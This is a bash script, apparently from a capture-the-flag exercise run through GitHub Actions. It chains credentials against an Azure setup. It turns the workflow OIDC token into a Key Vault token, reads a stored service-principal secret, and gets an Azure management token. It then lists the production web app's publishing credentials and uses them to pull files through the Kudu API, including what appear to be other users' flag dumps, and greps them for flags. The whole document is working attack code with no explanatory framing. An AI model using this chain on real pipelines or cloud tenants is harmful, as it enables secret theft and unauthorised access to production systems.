#!/usr/bin/env bash
set -uo pipefail
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RAPP="/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
API=2022-03-01
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
KV=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
J=$(curl -sS -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" | jq -r '.value')
RS=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$(echo "$J"|jq -r .appId)" -d "client_secret=$(echo "$J"|jq -r .clientSecret)" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
PUB=$(curl -sS -X POST -H "Authorization: Bearer $RS" -H "Content-Length: 0" "https://management.azure.com$RAPP/config/publishingcredentials/list?api-version=$API")
U=$(echo "$PUB"|jq -r '.properties.publishingUserName'); P=$(echo "$PUB"|jq -r '.properties.publishingPassword')
mkdir -p /tmp/w
FILES=".flag.out .flag.py ctf_flag_result flag_result.txt flag_hunt.out flag_hunt.py myflag.py readflag.py readflag2.py tnex_flag.json zz_mine_out.txt zz5_out.json zzk_out.json worker_probe_out.json df26grep.txt g2.txt g3.txt g4.txt o2.txt mitok.json mi_out.json mi_out2.json mi_dump.json check_kv.py kp.py kp2.py kp3.py zzg1792642178.py zzp1792640066.py"
for f in $FILES; do curl -sS -u "$U:$P" "$SCM/api/vfs/site/wwwroot/$f" -o "/tmp/w/${f//\//_}" 2>/dev/null; done
echo "========== GREP DF26 =========="
grep -raoE "DF26[{][^}]*[}]" /tmp/w 2>/dev/null | sort -u
echo "========== small result files =========="
for f in flag_result.txt ctf_flag_result .flag.out tnex_flag.json zz_mine_out.txt df26grep.txt g_out1.txt; do
  echo "----- $f -----"; head -c 900 "/tmp/w/${f//\//_}" 2>/dev/null; echo
done
echo DONE; exit 0
